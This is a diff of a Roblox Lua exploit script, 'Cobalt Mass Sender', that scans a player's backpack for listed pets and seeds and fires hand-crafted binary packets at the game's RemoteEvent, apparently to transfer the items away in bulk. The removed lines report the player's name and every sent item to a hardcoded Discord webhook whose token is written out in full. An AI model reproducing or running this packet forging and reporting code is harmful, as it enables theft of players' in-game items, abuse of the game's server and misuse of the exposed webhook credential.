@@ -1,114 +1,111 @@
--- Cobalt Mass Sender – dynamically builds payloads from backpack attributes
-local ALLOWED_PETS = {"Robin"}
-local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Blueberry","Mango","Cactus","Strawberry","Banana","Poison Apple","Tulip","Pineapple"}
-local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"
+-- Headless Cobalt Scanner & Auto-Fire Payload
+-- (Customised by admin)
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local Event = game:GetService("ReplicatedStorage").SharedModules.Packet.RemoteEvent
-local player = game:GetService("Players").LocalPlayer
-local backpack = player:WaitForChild("Backpack")
+local ALL_PETS = {"Robin"}
+local ALL_SEEDS = {"Hypno Bloom", "Green Bean", "Grape", "Coconut", "Mushroom", "Acorn", "Tomato", "Dragon's Breath", "Star Fruit", "Moon Bloom", "Briar Rose", "Venom Spitter", "Apple", "Venus Fly Trap", "Rocket Pop", "Bamboo", "Fire Fern", "Corn", "Pomegranate", "Sunflower", "Dragon Fruit", "Cherry", "Sun Bloom", "Blueberry", "Mango", "Cactus", "Strawberry", "Banana", "Poison Apple", "Tulip", "Pineapple"}
+local petSet = {}
+for _, name in ipairs(ALL_PETS) do petSet[name:lower()] = true end
+local seedSet = {}
+for _, name in ipairs(ALL_SEEDS) do seedSet[name:lower()] = true end
 
--- Quick lookup tables
-local petLookup = {}
-for _, p in ipairs(ALLOWED_PETS) do petLookup[p:lower()] = true end
-local seedLookup = {}
-for _, s in ipairs(ALLOWED_SEEDS) do seedLookup[s:lower()] = true end
+local backpack = player:WaitForChild("Backpack", 5)
+if not backpack then warn("Cobalt: Backpack not found."); return end
 
-local function sendWebhook(msg)
-    local req = (type(request) == "function" and request)
-        or (type(http_request) == "function" and http_request)
-        or (syn and type(syn.request) == "function" and syn.request)
-        or (http and type(http.request) == "function" and http.request)
-    if req then
-        pcall(req, {
-            Url = WEBHOOK,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode({content = msg})
-        })
+local scannedItems = {}
+for _, item in ipairs(backpack:GetChildren()) do
+    local mainCategory = item:GetAttribute("MainCategory")
+    if mainCategory == "Seed" then
+        local seedTool = item:GetAttribute("SeedTool")
+        if seedTool and seedSet[seedTool:lower()] then
+            local count = item:GetAttribute("Count") or 1
+            table.insert(scannedItems, {itemKey = seedTool, count = count, category = "Seeds"})
+        end
+    else
+        local petName = item:GetAttribute("Pet")
+        local petId = item:GetAttribute("PetId")
+        if petName and petSet[petName:lower()] then
+            table.insert(scannedItems, {itemKey = petId or "UnknownID", count = 1, category = "Pets"})
+        end
     end
 end
 
--- Builds a single item block matching Cobalt's exact binary format
-local function buildItemBlock(itemKey, count, category)
-    return table.concat({
-        "\x1C",                             -- opening tag
-        "\v\aItemKey",                      -- key: "ItemKey" (length 7)
-        "\v" .. string.char(#itemKey) .. itemKey,
-        "\v\x05Count",                      -- key: "Count"
-        "\x05" .. string.char(count),       -- int value
-        "\v\bCategory",                     -- key: "Category" (length 8)
-        "\v" .. string.char(#category) .. category
-    })
+if #scannedItems == 0 then
+    warn("Cobalt: No matching items found.")
+    return
 end
 
--- Verified headers from working Cobalt spy captures
-local HEADER_SINGLE = "!\x01\x18\x00\x00\xC0\x04\xD6&\xF0A\x1C\x05\x01"
-local HEADER_MULTI  = "!\x01\x33\x00\x00\xC0\x00X\xB8\xFFA\x1C\x05\x01"
+print(string.format("Cobalt: Found %d matching items! Firing payload...", #scannedItems))
 
-sendWebhook("🚀 **Mass Sender Started** by " .. player.Name)
-
-while true do
-    local items = backpack:GetChildren()
-    local queue = {}
-
-    -- Scan for allowed seeds and pets (max 20 per batch)
-    for _, item in ipairs(items) do
-        if #queue >= 20 then break end
-
-        local mainCat = item:GetAttribute("MainCategory")
-        if mainCat == "Seed" then
-            local seedName = item:GetAttribute("SeedTool")
-            if seedName and seedLookup[seedName:lower()] then
-                local count = item:GetAttribute("Count") or 1
-                table.insert(queue, {
-                    key = seedName,
-                    count = count,
-                    category = "Seeds",
-                    instance = item
-                })
-            end
-        else
-            local petName = item:GetAttribute("Pet")
-            local petId = item:GetAttribute("PetId")
-            if petName and petId and petLookup[petName:lower()] then
-                table.insert(queue, {
-                    key = "$" .. petId,     -- pet identifier: "$" + UUID
-                    count = 1,
-                    category = "Pets",
-                    instance = item
-                })
-            end
-        end
+local function smartEscape(str)
+    local escaped = ""
+    for i = 1, #str do
+        local char = str:sub(i, i)
+        local byteVal = string.byte(char)
+        if char == "\\" then
+            escaped = escaped .. "\\\\"
+        elseif char == "\"" then
+            escaped = escaped .. "\\\""
+        elseif byteVal >= 32 and byteVal <= 126 then
+            escaped = escaped .. char
+        elseif char == "\t" then escaped = escaped .. "\\t"
+        elseif char == "\n" then escaped = escaped .. "\\n"
+        elseif char == "\r" then escaped = escaped .. "\\r"
+        elseif char == "\v" then escaped = escaped .. "\\v"
+        elseif char == "\a" then escaped = escaped .. "\\a"
+        elseif char == "\b" then escaped = escaped .. "\\b"
+        else escaped = escaped .. string.format("\\x%02X", byteVal) end
     end
+    return escaped
+end
 
-    if #queue == 0 then
-        sendWebhook("🏁 **Inventory cleared** – no more matching items.")
-        break
+local function encodeString(str)
+    local sizeByte = string.format("\\x%02X", #str)
+    if #str == 11 then sizeByte = "\\v" elseif #str == 7 then sizeByte = "\\a" end
+    return "\\v" .. sizeByte .. smartEscape(str)
+end
+
+local function encodeNumber(num)
+    local numByte = string.format("\\x%02X", num)
+    if num == 11 then numByte = "\\v" elseif num == 7 then numByte = "\\a" end
+    return "\\x05" .. numByte
+end
+
+local finalBufferString = "!\\x01\\x1C\\x00\\x00\\xC0\\x04\\xD6&\\xF0A\\x1C\\x05"
+
+for index, item in ipairs(scannedItems) do
+    local indexByte = string.format("\\x%02X", index)
+    if index == 11 then indexByte = "\\v" elseif index == 7 then indexByte = "\\a" end
+    finalBufferString = finalBufferString .. indexByte .. "\\x1C"
+    finalBufferString = finalBufferString .. encodeString("ItemKey") .. encodeString(item.itemKey)
+    finalBufferString = finalBufferString .. encodeString("Count") .. encodeNumber(item.count)
+    finalBufferString = finalBufferString .. encodeString("Category") .. encodeString(item.category)
+    finalBufferString = finalBufferString .. "\\x00"
+    if index < #scannedItems then finalBufferString = finalBufferString .. "\\x05" end
+end
+finalBufferString = finalBufferString .. "\\x00\\x00"
+
+local packetEvent = ReplicatedStorage:FindFirstChild("SharedModules")
+    and ReplicatedStorage.SharedModules:FindFirstChild("Packet")
+    and ReplicatedStorage.SharedModules.Packet:FindFirstChild("RemoteEvent")
+
+if packetEvent then
+    local success, err = pcall(function()
+        local binaryStr = finalBufferString
+            :gsub("\\x(%x%x)", function(hex) return string.char(tonumber(hex, 16)) end)
+            :gsub("\\v", "\v"):gsub("\\a", "\a")
+            :gsub("\\t", "\t"):gsub("\\n", "\n"):gsub("\\r", "\r")
+            :gsub("\\b", "\b"):gsub("\\\\", "\\"):gsub('\\"', '"')
+        local payloadBuffer = buffer.fromstring(binaryStr)
+        packetEvent:FireServer(payloadBuffer)
+    end)
+    if success then
+        print("Cobalt: Payload fired!")
+    else
+        warn("Cobalt: Fire failed: " .. tostring(err))
     end
-
-    -- Choose the correct header
-    local header = (#queue == 1) and HEADER_SINGLE or HEADER_MULTI
-    local payload = header
-    for i, itemData in ipairs(queue) do
-        if i > 1 then
-            payload = payload .. "\x00\x05" .. string.char(i)   -- separator + index
-        end
-        payload = payload .. buildItemBlock(itemData.key, itemData.count, itemData.category)
-    end
-    payload = payload .. "\x00\x00\x00"   -- terminator
-
-    -- Fire the remote (no client‑side destruction)
-    if Event then
-        Event:FireServer(buffer.fromstring(payload))
-    end
-
-    -- Log sent items (escaped % for outer string.format)
-    local logLines = {}
-    for _, itemData in ipairs(queue) do
-        table.insert(logLines, string.format("• %s (x%d) sent.", itemData.instance.Name, itemData.count))
-    end
-    sendWebhook("⚡ **Batch fired (" .. #queue .. " items):**\n" .. table.concat(logLines, "\n"))
-
-    -- 12‑second cooldown
-    task.wait(12)
+else
+    warn("Cobalt: RemoteEvent not found.")
 end
